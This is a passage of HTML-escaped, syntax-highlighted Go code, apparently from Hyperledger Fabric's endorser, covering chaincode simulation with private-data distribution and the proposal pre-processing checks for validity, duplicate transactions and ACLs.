		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt;,
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// ---3. execute the proposal and get simulation results
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;callChaincode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeInput&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to invoke chaincode %s, error: %+v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TXSimulator&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// Note, this is a little goofy, as if there is private data, Done() gets called
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// early, so this is invoked multiple times, but that is how the code worked before
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// this change, so, should be safe.  Long term, let&amp;#39;s move the Done up to the create.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TXSimulator&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Done&lt;/span&gt;()

	&lt;span style=&#34;color:#a6e22e&#34;&gt;simResult&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TXSimulator&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetTxSimulationResults&lt;/span&gt;()
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;simResult&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PvtSimulationResults&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lscc&amp;#34;&lt;/span&gt; {
			&lt;span style=&#34;color:#75715e&#34;&gt;// TODO: remove once we can store collection configuration outside of LSCC
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Private data is forbidden to be used in instantiate&amp;#34;&lt;/span&gt;)
		}
		&lt;span style=&#34;color:#a6e22e&#34;&gt;pvtDataWithConfig&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;AssemblePvtRWSet&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;simResult&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PvtSimulationResults&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TXSimulator&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetDeployedCCInfoProvider&lt;/span&gt;())
		&lt;span style=&#34;color:#75715e&#34;&gt;// To read collection config need to read collection updates before
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// releasing the lock, hence txParams.TXSimulator.Done()  moved down here
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TXSimulator&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Done&lt;/span&gt;()

		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessage&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to obtain collections config&amp;#34;&lt;/span&gt;)
		}
		&lt;span style=&#34;color:#a6e22e&#34;&gt;endorsedAt&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetLedgerHeight&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessage&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to obtain ledger height for channel &amp;#39;%s&amp;#39;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;))
		}
		&lt;span style=&#34;color:#75715e&#34;&gt;// Add ledger height at which transaction was endorsed,
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// `endorsedAt` is obtained from the block storage and at times this could be &amp;#39;endorsement Height + 1&amp;#39;.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// However, since we use this height only to select the configuration (3rd parameter in distributePrivateData) and
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// manage transient store purge for orphaned private writesets (4th parameter in distributePrivateData), this works for now.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Ideally, ledger should add support in the simulator as a first class function `GetHeight()`.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;pvtDataWithConfig&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;EndorsedAt&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;endorsedAt&lt;/span&gt;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PrivateDataDistributor&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DistributePrivateData&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxID&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;pvtDataWithConfig&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;endorsedAt&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
		}
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;pubSimResBytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;simResult&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetPubSimulationBytes&lt;/span&gt;()
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SimulationFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;pubSimResBytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccevent&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// preProcess checks the tx proposal headers, uniqueness and ACL
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Endorser&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;preProcess&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;UnpackedProposal&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Channel&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt; {
	&lt;span style=&#34;color:#75715e&#34;&gt;// at first, we check whether the message is valid
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Validate&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IdentityDeserializer&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalValidationFailed&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessage&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error validating proposal&amp;#34;&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; {
		&lt;span style=&#34;color:#75715e&#34;&gt;// chainless proposals do not/cannot affect ledger and cannot be submitted as transactions
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// ignore uniqueness checks; also, chainless proposals are not validated using the policies
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// of the chain since by definition there is no chain; they are validated against the local
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// MSP of the peer instead by the call to ValidateUnpackProposal above
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// labels that provide context for failure metrics
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{
		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;channel&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;,
		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;,
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// Here we handle uniqueness check and ACLs for proposals targeting a chain
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// Notice that ValidateProposalMessage has already verified that TxID is computed properly
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetTransactionByID&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxId&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#75715e&#34;&gt;// increment failure due to duplicate transactions. Useful for catching replay attacks in
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// addition to benign retries
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DuplicateTxsFailure&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;duplicate transaction found [%s]. Creator [%x]&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignatureHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Creator&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// check ACL only for application chaincodes; ACLs
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// for system chaincodes are checked elsewhere
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;) {
